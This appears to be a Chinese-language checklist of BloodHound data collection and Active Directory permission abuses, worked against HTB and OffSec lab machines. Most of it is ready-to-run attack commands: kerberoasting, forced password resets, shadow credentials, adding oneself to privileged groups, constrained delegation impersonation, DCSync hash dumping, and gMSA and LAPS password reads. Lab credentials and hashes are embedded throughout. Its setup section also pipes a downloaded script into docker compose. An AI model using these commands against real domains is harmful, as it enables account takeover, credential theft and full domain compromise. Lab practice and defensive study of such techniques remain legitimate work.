此文章为 Bloodhound 滥用方式总结的 CheckList，包括解析

# Bloodhound 工具使用 
###### bloodhound-python
- 收集 bloodhound 需要的数据
```bash
bloodhound-python -c All -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' -ns 10.129.241.177 -d streamio.htb -dc streamio.htb --zip

bloodhound-python -d rebound.htb -c Group,LocalADmin,RDP,DCOM,Container,PSRemote,Session,Acl,Trusts,LoggedOn -u oorend -p '1GR8t@$$4u' -ns 10.10.11.231 --zip
```

如果强制 kerberos 验证，bloodhound-python 可能会无法执行，使用 netexec
```bash
netexec ldap rebound.htb -u ldap_monitor -p '1GR8t@$$4u' -k --bloodhound -ns 10.129.229.114 -c Group,LocalADmin,RDP,DCOM,Container,PSRemote,Session,Acl,Trusts,LoggedOn

crackmapexec ldap nara.nara-security.com -u Tracy.White -p 'zqwj041FGX' --bloodhound -c all -ns 172.16.201.26
```

###### bloodhound 初始化
```bash
sudo neo4j restart
```
###### SharpHound.ps1
```powershell
. .\SharpHound.ps1
Invoke-Bloodhound -c All 
```
###### SharpHound.exe
```powershell
.\SharpHound.exe -c All
```

**如果提示 zip 上传失败，尝试旧版 bloodhound , 或者重新选择 SharpHound 搜集版本**
###### **csv 文件导入 bloodhound :** 下载2.0以下的旧版本导入 
Download: https://github.com/BloodHoundAD/BloodHound/releases/download/1.5.2/BloodHound-linux-x64.zip


###### [+] 最新版 SharpHound collect 数据的时候要搭配 BloodhoundCommunity 版本使用
```bash
sudo bash -c 'curl -L https://ghst.ly/getbhce | BLOODHOUND_PORT=8888 docker compose -f - up'
```
并注意查看 admin 的密码 : `Initial Password Set To:    F1_PmINVaT7c8_9GfL3J_lURe9wCoGXi
Password has changed : `13255200155yT!`

在右上角设置 > Administrator > File Ingest 中上传用 SharpHound 收集的 zip 文件。



# 攻击滥用

##### 拥有域内账户凭据，同时有 kerberoastable 用户列出
- **0x01 Rubeus.exe**
```powershell
C:\windows\system32\spool\drivers\color\Rubeus.exe kerberoast /creduser:htb.local\amanda /credpassword:Ashare1972
```

- **0x02 GetUserSPNs.py**
```bash
python /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -request -dc-ip <IP> htb.local/amanda:Ashare1972
```


- ### GenericAll 滥用
##### 对 `用户` 有 GenericAll 权限
**0x01 直接修改用户密码**
PS Session
```powershell
net user <username> <password> /domain
```

Linux 的操作：
```bash
bloodyAD -d rebound.htb -u oorend -p '1GR8t@$$4u' --host dc01.rebound.htb set password winrm_svc 'xekOnerR!'
```

**0x02 禁用用户的预身份验证，使其帐户容易受到 ASREPRoasting 的攻击**
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

**0x03 影子凭证 （见下方 `AddKeyCredentialLink`） 推荐使用这种滥用方式**

##### 对 `组` 有 GenericAll 权限
将自己添加到域管理员组
```bash
0x01  net group "GROUP" USERNAME /add /domain
0x02  Add-ADGroupMember -Identity "GROUP" -Members USERNAME
0x03  Add-NetGroupUser -UserName spotUSERNAMEless -GroupName "GROUP" -Domain "DOMAIN"
```

**Linux 将自己添加到组 ：**
见下方 Self 滥用

[+] **对域控有所有权 ：** Kerberos 基于资源的约束委派  (见  [CheckList -  Windows , Actice Directory 攻击向量(Priv Esc , CMD)](CheckList%20-%20%20Windows%20,%20Actice%20Directory 攻击向量(Priv%20Esc%20,%20CMD).md) )


- ### GenericWrite 滥用
**更改用户的登录脚本路径，以便在用户登录时执行恶意脚本**
```bash
Set-DomainObject -Identity <User> -SET @{scriptpath="自定义脚本"}
```
例:
```
echo 'dir C:\users\<Users>\desktop\ > C:\programdata\dir.txt' > dir.ps1
Set-DomainObject -Identity <User> -SET @{scriptpath="C:\\programdata\\dir.ps1"}
```

**修改用户,启用 `DONT_REQ_PREAUTH` 标志, 配合 GetNPUsers.py 获取 hash 值**
```powershell
Get-DomainUser jorden | ConvertFrom-UACValue   (验证)
Set-DomainObject -Identity UserName -XOR @{useraccountcontrol=4194304} -Verbose
(再进行AS-REP攻击获取hash , GetNPUsers.py)
```

**Shadow Credential**
```bash
KRB5CCNAME=./m.lovegod.ccache certipy shadow auto -k -no-pass -u absolute.htb/m.lovegod@sc.absolute.htb -dc-ip 10.10.11.181 -target dc.absolute.htb -account winrm_user
```


- ### WriteDACL 滥用
```powershell
net group "GROUPNAME" /add USERNAME
```


- ### WriteOwner
```bash
Set-DomainObjectOwner -Identity B -OwnerIdentity A (设置 A 为 B 的 ACL 所有者)
Add-ObjectAcl -TargetIdentity B -PrincipalIdentity A -Rights ResetPassword (授予 A 更改 B 用户 ACL 上密码的权限)
$UserPassword=ConvertTo-SecureString 'xekOnerR!' -AsPlainText -Force (创建凭据信息设置密码)
Set-DomainUserPassword -Identity B -AccountPassword $UserPassword  (修改 B 的密码)
```


- ### Owns 滥用  
Owns 是**已经拥有**所有权，而 WriteOwner 是**可以设置**自己拥有所有权
##### 对 `组` 有 Owns 权限
**0x01 PS Session**
```powershell
Set-DomainObjectOwner -Identity "GroupName" -OwnerIdentity USERNAME
Add-DomainObjectAcl -TargetIdentity "GroupName" -PrincipalIdentity USERNAME -Rights All  (添加USERNAME拥有全部权限)
Add-DomainGroupMember -Identity 'GroupName' -Members 'USERNAME' (添加到组内)
```

**0x02 Linux With Impacket (dacledit.py)**
https://github.com/ShutdownRepo/impacket/tree/dacledit
为自己添加 `FullControl` 权限，从而可以控制这个组所控制的对象
```bash
source .venv/bin/activate
/usr/share/doc/python3-impacket/examples/getTGT.py absolute.htb/m.lovegod:'AbsoluteLDAP2022!' -dc-ip 10.10.11.181
KRB5CCNAME=~/CRTO-pr/Absolute/m.lovegod.ccache python3 ./examples/dacledit.py -dc-ip dc.absolute.htb -principal m.lovegod -target "Network Audit" -action write -rights FullControl absolute.htb/m.lovegod -k -no-pass
```
加入组操作
```bash
sudo apt install smb
sudo apt install krb5-user
( -- 修改/etc/krb5.conf --) [5986-WinRM 中有格式]
[rm /tmp/krb5cc_1000]
kinit m.lovegod
net rpc group addmem "Network Audit" m.lovegod -U 'm.lovegod' -S dc.absolute.htb [-k]
net rpc group members "Network Audit" -U 'm.lovegod' -S dc.absolute.htb  [-k] (验证)
```

**0x03 Windows Powershell with OpenVPN And DNS**
适用于 kerberos 认证方式或没有 Ps Session 的情况下，使用 windows 链接 openVPN 并配置 openVPN 的网卡 DNS 为**靶机** ip
```powershell
. .\powerview.ps1
$pass = ConvertTo-SecureString 'AbsoluteLDAP2022!' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('absolute.htb\m.lovegod', $pass)

Add-DomainObjectAcl -Credential $cred -TargetIdentity "Network Audit" -Rights All -PrincipalIdentity m.lovegod -DomainController dc.absolute.htb  
Add-DomainGroupMember -Credential $cred -Identity "Network Audit" -member m.lovegod -Domain "absolute.htb"
```
验证是否加入组 ：
```powershell
Get-DomainGroupMember -Credential $cred -Identity "Network Audit" -Domain "absolute.htb" -DomainController "dc.absolute.htb" | fl MemberName
```


- ###  AddKeyCredentialLink 滥用  （影子凭据）
**Windows**
```
从Outdated(0x26)下载whisker.exe
.\whisker.exe add /domain:outdated.htb /target:sflowers /dc:DC.outdated.htb /password:xekOnerR!
输入whisker给的Rubeus.exe的命令
拿到Hash
```

**Linux**
```bash
kinit USERNAME   (验证成功后会生成一个文件在/tmp目录下，默认名称为krb5cc_1000)
KRB5CCNAME=/tmp/krb5cc_1000 certipy find -username m.lovegod@absolute.htb -k -target dc.absolute.htb (检查是否安装ADCS)
KRB5CCNAME=/tmp/krb5cc_1000 certipy shadow auto -username m.lovegod@absolute.htb -account winrm_user -k -target dc.absolute.htb
```

**linux 0x02** 
```bash
certipy-ad shadow auto -username oorend@rebound.htb -password '1GR8t@$$4u' -k -account winrm_svc -target dc01.rebound.htb
```
拿到 NT hash 直接登录即可

- ### ForceChangePassword 滥用 (强制更改密码)
```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```


- ### AllowedToDelegate 滥用
```
sudo rdate -n 10.129.228.41   (调整时间)

/usr/share/doc/python3-impacket/examples/getST.py -dc-ip 10.129.228.41 -spn www/dc.intelligence.htb -hashes ":d365e889367ce3e3241b120db1df6e25" -impersonate administrator intelligence.htb/svc_int$ 

KRB5CCNAME=administrator.ccache /usr/share/doc/python3-impacket/examples/wmiexec.py -k -no-pass administrator@dc.intelligence.htb
```


- ### DCSync 滥用
```powershell
. .\PowerView.ps1
$pass =convertTo-securestring 'xekOnerR!' -asplaintext -force
$cred = new-object system.management.automation.pscredential('htb.local\xek',$pass)
Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity xek -Rights DCSync
```
然后使用 secretsdump.py 转储 hash 值

**如果有凭据可以直接执行 DCSync**
```bash
python ~/tool/impacket-dacledit/examples/secretsdump.py -dc-ip 10.129.96.90 HTB.LOCAL/mrlky:'Football#7'@HTB.LOCAL
```


- ### ReadGMSAPassword 滥用
```bash
python3 gMSADumper.py -u <USERNAME> -p <PASSWORD> -d <DOMAIN>

Users or groups who can read password for BIR-ADFS-GMSA$:                                                
 > ITSec                                                                                                 
BIR-ADFS-GMSA$:::e1e9fd9e46d0d747e1595167eedcec0f                                                        
BIR-ADFS-GMSA$:aes256-cts-hmac-sha1-96:06e03fa99d7a99ee1e58d795dccc7065a08fe7629441e57ce463be2bc51acf38
BIR-ADFS-GMSA$:aes128-cts-hmac-sha1-96:dc4a4346f54c0df29313ff8a21151a42
```
`:e1e9fd9e46d0d747e1595167eedcec0f` 就是 hash

如果无法登录 winrm，则可以尝试：**bloodyAD**
```bash
bloodyAD -d rebound.htb -u tbrady -p 543BOMBOMBUNmanda --host dc01.rebound.htb get object 'delegator$' --attr msDS-ManagedPassword
```

已拥有 PS Session 攻击
https://github.com/rvazarkar/GMSAPasswordReader
```powershell
.\RunasCs.exe tbrady 543BOMBOMBUNmanda -l 2 "\programdata\GMSAPasswordReader.exe --accountname delegator$"
.\GMSAPasswordReader.exe --accountname 'svc_apache'
```
rc4_hmac 就是等同于 HTLM Hash
```bash
netexec smb 192.168.218.165 -u svc_apache$ -H 023145FC00CE8BAB62704EB63AB7BDAB
...
SMB         192.168.218.165 445    DC01             [+] heist.offsec\svc_apache$:023145FC00CE8BAB62704EB63AB7BDAB
```


### Self (Self-Membership) on Group  (AddSelf)
使用了 powerview 脚本，或者是 **powerview 远程执行脚本**。
- 验证
```bash
Get-DomainObjectAcl -Indentity ServiceMGMT
```
`ActiveDirectoryRights       : Self`
- 滥用
```bash
Add-DomainGroupMember -Identity servicemgmt -Members oorend      (Powerview)

python3 ./bloodyAD.py -d rebound.htb -u oorend -p '1GR8t@$$4u' --host dc01.rebound.htb  (Linux)
```
- 滥用后验证
```bash
Get-DomainGroupMember -Identity ServiceMGMT
```


### Contanins
如果对 OU 有 GenericAll 的权限，目标又 Contains 在 Ou 中，那就修改自己对 Ou 的权限，修改自己在 Ou 中为所有权，即对 Ou 中所有的目标有 GenericAll 的权限
```bash
bloodyAD -d rebound.htb -u oorend -p '1GR8t@$$4u' --host dc01.rebound.htb add genericAll 'OU=SERVICE USERS,DC=REBOUND,DC=HTB' oorend
```

**继续滥用**
0x01 直接修改密码
```bash
bloodyAD -d rebound.htb -u oorend -p '1GR8t@$$4u' --host dc01.rebound.htb set password winrm_svc 'xekOnerR!'
```

0x02 影子凭据
```bash
certipy-ad shadow auto -username oorend@rebound.htb -password '1GR8t@$$4u' -k -account winrm_svc -target dc01.rebound.htb
```
拿到 NT hash 直接登录即可


- ### ReadLAPSPassword
python pyLAPS.py --action get -d "hutch.offsec" -u "fmcsorley" -p "CrabSharkJellyfish192"
```bash
python pyLAPS.py --action get -d "hutch.offsec" -u "fmcsorley" -p "CrabSharkJellyfish192"
```

crackmapexec 
```bash
crackmapexec ldap 192.168.219.122 -u fmcsorley -p CrabSharkJellyfish192 --kdcHost 192.168.219.122 -M laps
```


